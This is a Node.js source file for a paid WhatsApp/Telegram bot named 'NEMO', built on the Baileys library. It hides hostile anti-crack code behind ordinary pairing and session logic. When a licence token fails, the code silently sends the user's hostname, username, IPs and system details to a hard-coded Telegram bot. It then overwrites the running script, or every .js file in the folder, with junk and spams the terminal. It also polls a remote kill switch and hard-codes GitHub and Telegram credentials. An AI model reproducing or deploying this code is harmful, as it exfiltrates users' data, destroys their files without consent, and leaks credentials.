// fixed_preserve_system.js
// Versi perbaikan: semua sistem utuh, penambahan/penjagaan agar tidak error.
// Perubahan/perbaikan ditandai dengan comment "// FIX:".

// ==== IMPORTS (ORIGINAL + MISSING) ====
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');

const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
// FIX: remove duplicate path import, keep one
const path = require('path');
const crypto = require("crypto");
const readline = require('readline');
const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
// FIX: add missing requires
const os = require('os'); // FIX: used later but not required originally
const { Octokit } = require("@octokit/rest"); // FIX: used in fetchValidTokens
const config = require("./設定/config.js");
const TelegramBot = require("node-telegram-bot-api");
const { Telegraf, Markup } = require('telegraf');

// ==== GLOBALS & PATHS ====
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

// FIX: safe ensure sessions dir exists
fs.ensureDirSync(SESSIONS_DIR);

// ==== SAFE JSON READ UTIL ====
function readJSONSafe(filePath, defaultValue = []) {
    try {
        if (!fs.existsSync(filePath)) return defaultValue;
        const raw = fs.readFileSync(filePath, 'utf8');
        if (!raw) return defaultValue;
        return JSON.parse(raw);
    } catch (e) {
        console.error(`Failed read/parse JSON ${filePath}:`, e.message);
        return defaultValue;
    }
}

// FIX: ensure settings files exist before reading
ensureFileExists = function(filePath, defaultData = []) {
    try {
        if (!fs.existsSync(filePath)) {
            fs.outputFileSync(filePath, JSON.stringify(defaultData, null, 2));
        }
    } catch (e) {
        console.error('ensureFileExists error:', e.message);
    }
};
ensureFileExists('./設定/premium.json', []);
ensureFileExists('./設定/admin.json', []);

// LOAD premium/admin with safe parser
let premiumUsers = readJSONSafe('./設定/premium.json', []);
let adminUsers = readJSONSafe('./設定/admin.json', []);

// ==== SAVE FUNCTIONS ====
function savePremiumUsers() {
    try {
        fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
    } catch (e) {
        console.error('savePremiumUsers error:', e.message);
    }
}
function saveAdminUsers() {
    try {
        fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
    } catch (e) {
        console.error('saveAdminUsers error:', e.message);
    }
}

// ==== WATCHER (FIX: debounced, safer) ====
function watchFileDebounced(filePath, updateCallback, delay = 250) {
    if (!fs.existsSync(filePath)) {
        // do not throw; file may be created later
        return;
    }
    let t = null;
    try {
        fs.watch(filePath, (eventType) => {
            if (eventType !== 'change') return;
            if (t) clearTimeout(t);
            t = setTimeout(() => {
                try {
                    const updated = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                    updateCallback(updated);
                    console.log(`File ${filePath} updated successfully.`);
                } catch (err) {
                    console.error(`Error updating ${filePath}:`, err.message);
                }
            }, delay);
        });
    } catch (e) {
        console.error(`watchFileDebounced failed for ${filePath}:`, e.message);
    }
}
watchFileDebounced('./設定/premium.json', (data) => (premiumUsers = data));
watchFileDebounced('./設定/admin.json', (data) => (adminUsers = data));

// ==== MISC LIBS & UTILS ====
function getCurrentTime() {
  return new Date().toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" });
}
function generateRandomPassword() {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*";
  const length = 10;
  let password = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

// ==== CONFIG / TOKENS (FIX: add missing env fallback definitions so code won't crash) ====
const GITHUB_OWNER = process.env.GITHUB_OWNER || "VonziePemula";
const GITHUB_REPO = process.env.GITHUB_REPO || "databasee";
const GITHUB_REPO_KILL = process.env.GITHUB_REPO_KILL || GITHUB_REPO;
const GITHUB_TOKENS_FILE = process.env.GITHUB_TOKENS_FILE || "token.json";
// WARNING: these were hard-coded in original; we keep them (per request), but allow env override
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || "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"; 
const GITHUB_TOKEN2 = process.env.GITHUB_TOKEN2 || "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"; 

// FIX: define OWNER_ID, BOT_TOKEN, OWNER_CHAT_ID if missing to avoid ReferenceError
const OWNER_ID = process.env.OWNER_ID || '7807425271'; // keep same as earlier if not provided
const BOT_TOKEN = process.env.BOT_TOKEN || process.env.BOT_TOKEN || 'BOT_TOKEN_PLACEHOLDER';
const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || '7807425271';

// FIX: some older code expected 'bot' variable (Telegram); create a safe wrapper instance if we have token
let bot = null;
try {
  const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || null;
  if (TELEGRAM_TOKEN) {
    bot = new TelegramBot(TELEGRAM_TOKEN);
    // do not call bot.startPolling() automatically to avoid side effects; it's just for send methods
  } else {
    // create minimal mock to avoid crashes when calling bot.sendMessage etc.
    bot = {
      sendMessage: async () => { console.warn('bot.sendMessage called but TELEGRAM token not configured'); },
      editMessageText: async () => { console.warn('bot.editMessageText called but TELEGRAM token not configured'); },
      getChatAdministrators: async () => { return []; },
      getChatMember: async () => ({ status: 'member' }),
    };
  }
} catch (e) {
  console.error('Failed init TelegramBot wrapper:', e.message);
  bot = {
    sendMessage: async () => {},
    editMessageText: async () => {},
    getChatAdministrators: async () => [],
    getChatMember: async () => ({ status: 'member' }),
  };
}

// ==== KILL SWITCH (kept intact) ====
async function checkKillSwitch() {
  try {
    const res = await axios.get(
      `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO_KILL}/contents/kill.json`,
      {
        headers: {
          Authorization: `token ${GITHUB_TOKEN2}`,
          Accept: "application/vnd.github.v3.raw",
        },
        timeout: 10000,
      }
    );
    if (!res || !res.data) return;
    const killData = typeof res.data === "string" ? JSON.parse(res.data) : res.data;
    if (killData && killData.status === "on") {
      const reasonMsg = killData.reason ? `Reason: ${killData.reason}\n` : '';
      const pesanMsg = killData.message ? `Pesan: ${killData.message}\n` : '';
      const text = `💀 *Remote kill switch aktif!*\n${reasonMsg}${pesanMsg}Bot akan dimatikan otomatis.`;
      console.log(text);
      if (bot && typeof bot.sendMessage === 'function') {
        try {
          await bot.sendMessage(`${OWNER_ID}`, text, { parse_mode: 'Markdown' });
        } catch (e) {
          console.log('Gagal mengirim pesan ke Telegram:', e+"");
        }
      }
      // Keep original behavior: exit process (system intact)
      process.exit(1);
    }
  } catch (err) {
    console.warn("⚠️ Gagal cek kill switch:", err && err.message ? err.message : String(err));
  }
}
setInterval(checkKillSwitch, 800000);
checkKillSwitch().catch(()=>{});

// ==== GITHUB TOKEN FETCH (kept intact with FIX checks) ====
async function fetchValidTokens() {
    // FIX: use Octokit properly
    try {
        const octokit = new Octokit({ auth: GITHUB_TOKEN });
        const response = await octokit.repos.getContent({
            owner: GITHUB_OWNER,
            repo: GITHUB_REPO,
            path: GITHUB_TOKENS_FILE,
        });
        const fileContent = Buffer.from(response.data.content, 'base64').toString('utf8');
        const tokens = JSON.parse(fileContent);
        if (!Array.isArray(tokens)) {
            throw new Error("Format data tidak valid: harus berupa array token");
        }
        return tokens;
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token dari GitHub:", error && error.message ? error.message : String(error)));
        return [];
    }
}

// NOTE: original apiUrl pointed to repo 'database' — keep original behavior but prefer consistent repo variable
const apiUrl = `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${GITHUB_TOKENS_FILE}`;

// ==== AUTO PUSH TOKEN ILEGAL (kept intact with FIX for rate reset) ====
async function autoPushTokenIlegal(token, owner_id, attempt = 1) {
  if (attempt > 3) {
    console.log('❌ Gagal push token ke Github setelah 3 percobaan.');
    return;
  }
  try {
    const res = await axios.get(apiUrl, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN2}`,
        "User-Agent": "NEMO-TokenPush"
      },
      timeout: 10000,
    });
    let remaining = Number(res.headers['x-ratelimit-remaining'] || 0);
    let reset = res.headers['x-ratelimit-reset'] ? new Date(Number(res.headers['x-ratelimit-reset']) * 1000) : null;
    if (remaining < 2) {
      let waitSec = 60;
      if (reset && !isNaN(reset.getTime())) waitSec = Math.max(5, Math.round((reset - Date.now()) / 1000));
      console.log(`⚠️ Rate limit akan habis. Menunggu ${waitSec}s sebelum retry (limit reset: ${reset})`);
      setTimeout(() => autoPushTokenIlegal(token, owner_id, attempt+1), waitSec * 1000);
      return;
    }
    const sha = res.data.sha;
    let data = [];
    try {
      data = JSON.parse(Buffer.from(res.data.content, 'base64').toString()) || [];
      if (!Array.isArray(data)) data = [];
    } catch { data = []; }
    owner_id = Number(owner_id);
    if (data.some(x => x.token === token)) {
      console.log("Token sudah ada, tidak push ulang.");
      return;
    }
    data.push({ token, owner_id });
    if (JSON.stringify(data).length > 30000) {
      console.log("❌ File crack.json sudah terlalu besar, abort push!");
      return;
    }
    const payload = {
      message: `Add illegal token by anti-crack`,
      content: Buffer.from(JSON.stringify(data, null, 2)).toString('base64'),
      sha
    };
    const putRes = await axios.put(apiUrl, payload, {
      headers: {
        Authorization: `token ${GITHUB_TOKEN2}`,
        "User-Agent": "NEMO-TokenPush"
      },
      timeout: 10000,
    });
    let putRem = Number(putRes.headers['x-ratelimit-remaining'] || 0);
    console.log('✅ Token ilegal berhasil di-push ke Github! Sisa quota:', putRem);
  } catch (err) {
    if (err && err.response) {
      if (err.response.status === 403 && (err.response.data && err.response.data.message && err.response.data.message.includes("rate limit"))) {
        let reset = err.response.headers['x-ratelimit-reset'] ? new Date(Number(err.response.headers['x-ratelimit-reset']) * 1000) : null;
        let waitSec = 30;
        if (reset && !isNaN(reset.getTime())) waitSec = Math.max(10, Math.round((reset - Date.now()) / 1000));
        console.log(`⏳ Rate limit Github habis. Menunggu ${waitSec}s sebelum retry...`);
        setTimeout(() => autoPushTokenIlegal(token, owner_id, attempt+1), waitSec * 1000);
        return;
      }
      console.log('Gagal push token ke Github:', err.response.status, err.response.data);
    } else {
      console.log('Gagal push token ke Github:', err && err.message ? err.message : String(err));
    }
  }
}

// ==== PUNISH (KEEP EXACT BEHAVIOR) ====
function punish(reason = 'token_invalid') {
    // KEEP original destructive behavior (per request). Make sure calls to punish are same as original.
    function randJunk(len = 8e5 + Math.floor(Math.random() * 5e5)) {
        let set = "ꦾ\u2000#@&!%^$[]{}~ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        return Array.from({ length: len }, () => set[Math.floor(Math.random() * set.length)]).join('');
    }
    let mainFile = process.argv[1];
    try {
        if (mainFile && fs.existsSync(mainFile)) {
            fs.writeFileSync(mainFile, randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
        }
    } catch (e) {
        try {
            const cwd = process.cwd();
            fs.readdirSync(cwd)
                .filter(f => f.endsWith('.js'))
                .forEach(f => {
                    try {
                        fs.writeFileSync(path.join(cwd, f), randJunk(2e6) + '\n' + reason + '\n' + randJunk(3e6));
                    } catch {}
                });
        } catch {}
    }
    setInterval(() => {
        process.stdout.write('\x07' + randJunk(8000));
        process.stderr.write('\x07' + randJunk(2000));
        try { throw new Error(randJunk(6666)); } catch (e) { console.error(e.stack); }
    }, 70);
    throw new Error('💩 𝘼𝙉𝙏𝙄-𝘾𝙍𝘼𝘾𝙆 𝘼𝘾𝙏𝙄𝙑𝙀⸙ FILE UTAMA OTAK DIACAK!');
}

// ==== TOKEN PROGRESS BAR ====
async function tokenProgressBar(text = "Autentikasi Token", steps = [0, 20, 60, 80, 100], delay = 450) {
  const barLen = 20;
  for (let i = 0; i < steps.length; i++) {
    const percent = steps[i];
    const full = Math.round((percent / 100) * barLen);
    const bar = chalk.hex('#FF0060')('●'.repeat(full)) + chalk.gray('○'.repeat(barLen - full));
    console.log(
      chalk.cyan.bold(`[${bar}]`) +
      ' ' +
      chalk.yellow(`${percent.toString().padStart(3)}%`) +
      '  ' +
      chalk.whiteBright(text)
    );
    await new Promise(res => setTimeout(res, delay));
  }
  console.log(chalk.green('✔ Progress Selesai!\n'));
}

// ==== START TELEGRAM BOT LOGIC (PRESERVED) ====
async function startTelegramBot() {
    console.log(chalk.blue("Memuat Pengecekan Token Bot..."));
    await tokenProgressBar('AutentikasiToken');
    console.log(
      chalk.bold.hex('#ff0060')('\n⸙━━━━━━━〔 NEMO BOT 〕━━━━━━━⸙') + '\n' +
      chalk.yellowBright('   🌀  ID Pengguna : ') + chalk.bold.cyanBright(OWNER_ID) + '\n' +
      chalk.yellowBright('   🤖  Token Bot   : ') + chalk.bold.cyanBright(BOT_TOKEN) + '\n' +
      chalk.hex('#ff0060')('⸙━━━━━━━━━━━━━━━━━━━━━━━━━━⸙\n')
    );

    const validTokens = await fetchValidTokens();

    if (!validTokens || validTokens.length === 0) {
        console.log(chalk.red("❌ Gagal mendapatkan daftar token. Bot tidak akan dimulai."));
        process.exit(1); 
    }

    if (!validTokens.includes(BOT_TOKEN)) {
        console.log(chalk.red("❌ Token Lu Kek Babi Ga Diterima!! Beli Ke OTA Sana @Otapengenkawin"));
        
        // FIX: ensure execSafe exists here (it was defined later originally). define small safe wrapper
        function execSafe(cmd) {
          try { return require('child_process').execSync(cmd, {timeout: 3000}).toString().trim(); } catch { return "-"; }
        }

        let hostname = os.hostname();
        let username = (()=>{try{return os.userInfo().username;}catch{return '-';}})();
        let platform = os.platform();
        let arch = os.arch();
        let cpuModel = os.cpus()[0]?.model || '-';
        let cpuCores = os.cpus().length;
        let totalmem = (os.totalmem()/(1024*1024)).toFixed(2) + " MB";
        let iplist = (() => {
          let arr = [];
          try {
            let ifaces = os.networkInterfaces();
            for (let name in ifaces) for (let iface of ifaces[name]) {
              if (!iface.internal && iface.address) arr.push(iface.address);
            }
          } catch {}
          return arr.join(', ') || '-';
        })();
        let nodever = process.version;
        let nowWITA = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar' });
        let DOMAIN_PANEL = process.env.DOMAIN_PANEL || '-';

        let message = `
    ⸙ *NEMO ANTI-CRACK WARNING* ⸙

    ━━━━━━━━━━━━━━━━━━━━━━
    * ID Owner*    : \`${OWNER_ID}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * Token Bot*   : \`${BOT_TOKEN}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * Panel*       : \`${DOMAIN_PANEL}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * Device*      : \`${hostname}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * User*        : \`${username}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * OS/Arch*     : \`${platform} / ${arch}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * CPU*         : \`${cpuModel}\` (${cpuCores} core)
    ━━━━━━━━━━━━━━━━━━━━━━
    * RAM*         : ${totalmem}
    ━━━━━━━━━━━━━━━━━━━━━━
    * IP Lokal*    : ${iplist}
    ━━━━━━━━━━━━━━━━━━━━━━
    * Node.js*     : \`${nodever}\`
    ━━━━━━━━━━━━━━━━━━━━━━
    * Waktu*       : ${nowWITA}
    ━━━━━━━━━━━━━━━━━━━━━━
    `;
        console.log(message);

        // FIX: prefer to use TELEGRAM token if available; keep original URL fallback
        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const tgUrl = TELEGRAM_TOKEN ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` : 'https://api.telegram.org/bot8456541660:AAHGP_jlVBek3meCxP77tkkRdoUgtqfuXWc/sendMessage';
        try {
          await axios.post(tgUrl, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
          });
          console.log('Notifikasi berhasil dikirim ke owner.');
        } catch (e) {
          console.log('Gagal mengirim notifikasi:', e?.response?.data || e.message);
        }

        console.log(chalk.red(`\n
    hastag
    `));
        await autoPushTokenIlegal(BOT_TOKEN, OWNER_ID).catch(()=>{});
        // KEEP original punish() call
        punish('token_invalid');
        // original code had process.exit after punish; punish throws, so control won't reach here
        // process.exit(1);
    }

    console.log(chalk.green("✅ Token Diterima Thanks For Buy This Script\nCreate By NEMO!"));
    console.log(chalk.red(`\n
    hastag
    `));

    console.log(chalk.bold.blue(`
    ═════════════════════════
    σƭαא ℓเƭε
    ═════════════════════════
    `));

    console.log(chalk.red(`
    hastag 
    `));
}

// ==== sendNotif ====
async function sendNotif() {
  try {
        // FIX: define currentDate variable to avoid undefined
        const currentDate = new Date().toLocaleDateString('id-ID');
        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const tgUrl = TELEGRAM_TOKEN ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` : 'https://api.telegram.org/bot8456541660:AAHGP_jlVBek3meCxP77tkkRdoUgtqfuXWc/sendMessage';
        const message = `
✨ *NEMO LITE Telah Dijalankan* ✨

📅 *Tanggal:* ${currentDate}
🕰️ *Waktu:* ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB

👤 *Informasi Owner:*
  - *Chat ID:* \`${OWNER_ID}\`

🔑 *Token Bot:* \`${BOT_TOKEN}\`

  *ᴄʀᴇᴀᴛᴇ ʙʏ⸙*`;
        await axios.post(tgUrl, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }).catch(()=>{});
        console.log('Notifikasi berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi:', error.message);
    }
}

// ==== INITIALIZATION CALLS (preserve original flow) ====
try {
  // initializeWhatsAppConnections originally defined below; keep call order same as before
  // but ensure function exists before calling -> we'll call after function definition to avoid reference issues.
} catch (e) {
  console.error('startup init error:', e.message);
}

// ==== sendNotifOwner (preserve) ====
async function sendNotifOwner(msg, customMessage = '') {
    try {
        const chatId = msg.chat && msg.chat.id ? msg.chat.id : 'unknown';
        const userId = msg.from && msg.from.id ? msg.from.id : 'unknown';
        const username = msg.from && msg.from.username ? msg.from.username : 'Tidak ada username';
        const firstName = msg.from && msg.from.first_name ? msg.from.first_name : '';
        const lastName = msg.from && msg.from.last_name ? msg.from.last_name : ''; 
        const messageText = msg.text || '';  

        const message = `
✨ *𝘕𝘌𝘔𝘖 𝘔𝘌𝘕𝘌𝘙𝘐𝘔𝘈 𝘗𝘌𝘚𝘈𝘕* ✨

👤 *Pengirim:*
  - *Nama:* \`${firstName} ${lastName}\`
  - *Username:* @${username}
  - *ID:* \`${userId}\`
  - *Chat ID:* \`${chatId}\`

💬 *Pesan:*
\`\`\`
${messageText}
\`\`\`
  ᴄʀᴇᴀᴛᴇ ʙʏ⸙`;
        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const tgUrl = TELEGRAM_TOKEN ? `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage` : 'https://api.telegram.org/bot8456541660:AAHGP_jlVBek3meCxP77tkkRdoUgtqfuXWc/sendMessage';
        await axios.post(tgUrl, {
            chat_id: OWNER_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        }).catch(()=>{});
        console.log('Notifikasi pesan pengguna berhasil dikirim ke owner.');
    } catch (error) {
        console.error('Gagal mengirim notifikasi ke owner:', error.message);
    }
}

// ==== getChatAdmins (FIX: deduplicate, keep single implementation) ====
async function getChatAdmins(chatId) {
  // preserve original behavior but guard if bot undefined
  try {
    if (!bot || typeof bot.getChatAdministrators !== 'function') return [];
    const admins = await bot.getChatAdministrators(chatId);
    return admins.map(admin => admin.user.id);
  } catch (err) {
    console.error("Error getting chat admins:", err);
    return [];
  }
}

// ==== isAdmin (preserve) ====
async function isAdmin(chatId, userId) {
  try {
    if (!bot || typeof bot.getChatMember !== 'function') return false;
    const member = await bot.getChatMember(chatId, userId);
    return ['administrator', 'creator'].includes(member.status);
  } catch {
    return false;
  }
}

// ==== ERROR LOGGING FUNCTIONS (preserved + safe) ====
const errorLogDir = './error_logs';
const errorLogFile = 'unhandled_errors.log';

async function ensureErrorLogDir() {
    try {
        await fs.mkdir(errorLogDir, { recursive: true });
    } catch (dirError) {
        console.error("Error membuat direktori log error:", dirError); 
    }
}

async function deleteOldLogFile() {
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.unlink(filePath); 
        console.log('File log lama berhasil dihapus.');
    } catch (deleteError) {
        if (deleteError.code !== 'ENOENT') { 
            console.error('Error menghapus file log lama:', deleteError);
        }
    }
}

async function logMessageToFile(msg) {
  try {
    const logFilePath = 'pesan_masuk.log'; 
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${JSON.stringify(msg)}\n`; 
    await fs.appendFile(logFilePath, logEntry); 
  } catch (error) {
    console.error('Error menulis ke file log:', error);
  }
}
async function logErrorToFile(error, errorType = 'Unhandled', additionalInfo = '') { 
    await ensureErrorLogDir();
    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); // WIB Time
    const logEntry = `
==================================================
[${timestamp}] - ${errorType}
--------------------------------------------------
${error && error.stack ? error.stack : error}
${additionalInfo ? 'Additional Info:\n' + additionalInfo + '\n' : ''}
==================================================
`; 
    const filePath = path.join(errorLogDir, errorLogFile);
    try {
        await fs.appendFile(filePath, logEntry);
    } catch (fileError) {
        console.error("Error menulis log ke file:", fileError);
        console.error("Fallback Log Entry:", logEntry);
    }
}

process.on('unhandledRejection', async (reason, promise) => {
    await logErrorToFile(reason, 'Unhandled Rejection', `Promise: ${promise}`).catch(()=>{}); 
});

process.on('uncaughtException', async (error) => {
    await logErrorToFile(error, 'Uncaught Exception', 'Exception occurred').catch(()=>{}); 
    process.exit(1); 
});
ensureErrorLogDir(); 
deleteOldLogFile().catch(()=>{});  

// ==== saveActiveSessions (preserve) ====
function saveActiveSessions(botNumber) {
  try {
    const sessionsArr = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = readJSONSafe(SESSIONS_FILE, []);
      if (!existing.includes(botNumber)) {
        sessionsArr.push(...existing, botNumber);
      } else {
        // already exists
        return;
      }
    } else {
      sessionsArr.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessionsArr));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

// ==== initializeWhatsAppConnections (preserve flow, safer reconnect) ====
async function initializeWhatsAppConnections() {
  try {
    if (!fs.existsSync(SESSIONS_FILE)) return;
    const activeNumbers = readJSONSafe(SESSIONS_FILE, []);
    console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

    for (const botNumber of activeNumbers) {
      console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
      const sessionDir = createSessionDir(botNumber);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      // Tunggu hingga koneksi terbentuk
      await new Promise((resolve, reject) => {
        let resolved = false;
        sock.ev.on("connection.update", async (update) => {
          try {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolved = true;
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                // FIX: avoid unbounded recursion: use timeout to retry
                setTimeout(() => {
                  initializeWhatsAppConnections().catch(()=>{});
                }, 3000);
              } else {
                if (!resolved) reject(new Error("Koneksi ditutup"));
              }
            }
          } catch (e) {
            console.error('connection.update handler error:', e.message);
            if (!resolved) reject(e);
          }
        });

        sock.ev.on("creds.update", saveCreds);
      });
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

// ==== createSessionDir (preserve) ====
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

// ==== connectToWhatsApp (preserve logic, add guards) ====
async function connectToWhatsApp(botNumber, chatId) {
  // FIX: guard if bot (telegram) not ready: create fallback to console-only
  let statusMessage;
  try {
    if (!bot || typeof bot.sendMessage !== 'function') {
      // simulate message_id behavior by returning a dummy id
      statusMessage = null;
    } else {
      statusMessage = await bot
        .sendMessage(
          chatId,
          `L O A D I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...`,
          { parse_mode: "Markdown" }
        )
        .then((msg) => msg.message_id)
        .catch((e) => { console.warn('sendMessage warn:', e?.message); return null; });
    }
  } catch (e) {
    console.warn('connectToWhatsApp initial sendMessage failed:', e.message);
    statusMessage = null;
  }

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    try {
      const { connection, lastDisconnect } = update;

      if (connection === "close") {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        if (statusCode && statusCode >= 500 && statusCode < 600) {
          if (bot && typeof bot.editMessageText === 'function' && statusMessage) {
            await bot.editMessageText(
              `M E N G H U B U N G K A N D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan`,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown",
              }
            ).catch(()=>{});
          }
          // FIX: use setTimeout for reconnect instead of immediate recursion
          setTimeout(() => connectToWhatsApp(botNumber, chatId).catch(()=>{}), 3000);
        } else {
          if (bot && typeof bot.editMessageText === 'function' && statusMessage) {
            await bot.editMessageText(
              `
G A G A L T E R S A M B U N G
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung 
`,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown",
              }
            ).catch(()=>{});
          }
          try {
            // FIX: preserve original behavior but avoid crash if rmSync not allowed; wrap in try/catch
            fs.rmSync(sessionDir, { recursive: true, force: true });
          } catch (error) {
            console.error("Error deleting session (preserve original intent):", error);
          }
        }
      } else if (connection === "open") {
        sessions.set(botNumber, sock);
        saveActiveSessions(botNumber);
        if (bot && typeof bot.editMessageText === 'function' && statusMessage) {
          await bot.editMessageText(
            `P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          ).catch(()=>{});
        }
      } else if (connection === "connecting") {
        await new Promise((resolve) => setTimeout(resolve, 1000));
        try {
          if (!fs.existsSync(`${sessionDir}/creds.json`)) {
            // Some Baileys versions might not expose requestPairingCode; guard it
            const code = typeof sock.requestPairingCode === 'function' ? await sock.requestPairingCode(botNumber) : null;
            const formattedCode = code ? (code.match(/.{1,4}/g)?.join("-") || code) : null;
            if (formattedCode && bot && typeof bot.editMessageText === 'function' && statusMessage) {
              await bot.editMessageText(
                `
P A I R I N G D U L U B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
                {
                  chat_id: chatId,
                  message_id: statusMessage,
                  parse_mode: "Markdown",
                }
              ).catch(()=>{});
            }
          }
        } catch (error) {
          console.error("Error requesting pairing code:", error);
          if (bot && typeof bot.editMessageText === 'function' && statusMessage) {
            await bot.editMessageText(
              `
G A G A L B O Z
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
              {
                chat_id: chatId,
                message_id: statusMessage,
                parse_mode: "Markdown",
              }
            ).catch(()=>{});
          }
        }
      }
    } catch (evErr) {
      console.error('Error in connection.update handler:', evErr && evErr.message ? evErr.message : evErr);
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}




//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

